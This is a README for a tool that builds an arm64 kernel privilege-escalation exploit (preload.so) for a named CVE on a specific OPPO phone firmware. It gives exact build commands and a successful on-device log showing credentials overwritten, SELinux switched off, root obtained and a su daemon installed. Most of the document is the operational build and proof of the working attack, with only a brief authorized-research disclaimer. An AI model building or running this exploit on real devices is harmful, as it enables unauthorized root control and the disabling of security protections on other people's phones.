# X9 Ultra preload.so builder

Builds the CVE-2026-43499 arm64 `preload.so` from a matching X9 Ultra
`boot.img` and `xbl_config.img`.

The firmware images are used locally to recover build-specific kernel symbols,
BTF structure offsets, the futex/`pselect` stack layout, and the physical load
profile. They are never copied into the output or repository.

## Requirements

- Python 3.10 or newer
- GNU Make
- Android NDK r27 or newer
- Matching `boot.img` and `xbl_config.img` from the same firmware release

No `kallsyms` dump is required for the build.

## One-command build

Clone the repository and run:

```sh
python3 build.py \
  --boot /path/to/boot.img \
  --xbl-config /path/to/xbl_config.img \
  --ndk-root /path/to/android-ndk
```

Output:

```text
out/preload.so
```

The builder automatically selects the NDK's arm64 API-35 compiler and
`llvm-objdump`, regenerates `source/src/target.h`, cleans the previous build,
and prints the final SHA-256 digest.

### Windows

Use Python and GNU Make from Git for Windows, MSYS2, or a similar environment:

```powershell
py -3 build.py `
  --boot "C:\firmware\boot.img" `
  --xbl-config "C:\firmware\xbl_config.img" `
  --ndk-root "C:\Users\YOU\AppData\Local\Android\Sdk\ndk\27.2.12479018"
```

If GNU Make has a different name, add `--make mingw32-make` or its full path.

## Manual build

Generate the target header:

```sh
python3 generate_target.py \
  --boot /path/to/boot.img \
  --xbl-config /path/to/xbl_config.img \
  --llvm-objdump "$NDK_TOOLCHAIN/bin/llvm-objdump" \
  -o source/src/target.h
```

Then compile:

```sh
make -C source clean preload \
  NDK_ROOT=/path/to/android-ndk \
  NDK_TOOLCHAIN=/path/to/android-ndk/toolchains/llvm/prebuilt/linux-x86_64
```

The manual Make output is `source/build/bin/preload.so`.

## Physical-device validation

Tested successfully on:

- Device: **OPPO Find X9 Ultra**
- Product/model identifiers: `CPH2841EEA` / `OP627CL1`
- Firmware: EU `16.0.9.403`
- Kernel: `6.12.58-android16-6-g7704a1ae279b-ab15213644-4k`

Successful on-device log:

```text
[+] direct-step selinux_target=ffffffd7519b5948
[+] direct-step install_real_cred attempt=1/3 target=ffffff8a29f0e1f8 value=ffffffd751743830
[+] direct-w64[2] target=ffffff8a29f0e1f8 value=ffffffd751743830 shape=1 workspace=ffffff88a8f60000
[*] pselect attempt=1 ret=252 errno=0 result_mode=1 sets_match=1 calls=1 success=1
[+] direct-step install_cred_then_selinux_zero target=ffffff8a29f0e200 value=ffffffd751743830 followup=ffffffd7519b5948
[+] direct-w64[3] target=ffffff8a29f0e200 value=ffffffd751743830 shape=1 workspace=ffffff88b4d28000
[*] pselect attempt=1 ret=254 errno=0 result_mode=1 sets_match=1 calls=1 success=1
[+] direct-w64[4] target=ffffffd7519b5948 value=ffffff88b4d28100 shape=1 workspace=ffffff8ac1cc8000
[*] pselect attempt=1 ret=242 errno=0 result_mode=1 sets_match=1 calls=1 success=1
[+] direct credential result uid=0 euid=0 gid=0 egid=0 task=ffffff8a29f0d900 init_cred=ffffffd751743830 selinux=1->0 policy_reload=2033314 policy_ok=1
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
[+] embedded su wrote 15304 bytes to /data/local/tmp/su
[*] local su client install ok=1 path=/data/local/tmp/su
[+] local su binary ready path=/data/local/tmp/su
[+] embedded su daemon ready pid=17125 socket=/data/local/tmp/temp_su.sock path=/data/local/tmp/su local=1 apex=0
[+] direct-su-first-pass ok=1 errno=2 daemon=17125 uid=0
[+] direct-root-summary root=1 id=1 su=1/2 daemon=17125 selinux=1->0 uid=0 euid=0 gid=0 egid=0
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

## Important

Offsets are firmware-build-specific. Always regenerate and rebuild with the
`boot.img` and `xbl_config.img` from the exact OTA installed on the device.
Using mismatched images can panic the kernel.

For authorized security research on devices you own. Kernel exploitation can
crash or reboot the device; keep the matching firmware available for recovery.
